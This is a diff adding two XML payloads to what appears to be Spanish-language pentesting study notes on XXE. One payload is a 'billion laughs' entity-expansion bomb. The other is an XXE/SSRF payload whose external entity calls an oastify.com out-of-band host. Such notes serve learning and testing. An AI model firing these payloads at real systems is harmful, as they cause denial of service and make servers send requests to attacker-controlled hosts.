@@ -87,6 +87,36 @@ En el archivo XML debemos de colocar un DOCTYPE y ese es el que estaremos modifi
 	</root>
 ```
 
+```xml 
+<!-- Un millon de risas -->
+
+<?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE example [
+  <!ELEMENT example ANY >
+  <!ENTITY lol "lol">
+  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+  ]>
+<example>
+  &lol9;
+</example>
+```
+
+```xml 
+<!-- XXE -- SSRF -->
+
+<!DOCTYPE xxe [ 
+  <!ENTITY juju SYSTEM "http://9lvskwimvjek0wq5s8up8ja0grmia8yx.oastify.com?nombre=omar"> 
+]>
+```
+
 ## **XXE OOB Blind**
 Cuando no se puede llamar la entidad desde el campo seleccionado en la estructura, lo llamamos desde el DOCTYPE colocando el porcentaje al inicio y final con el nombre. El archivo debe de tener la extensión **.dtd**
 ```xml
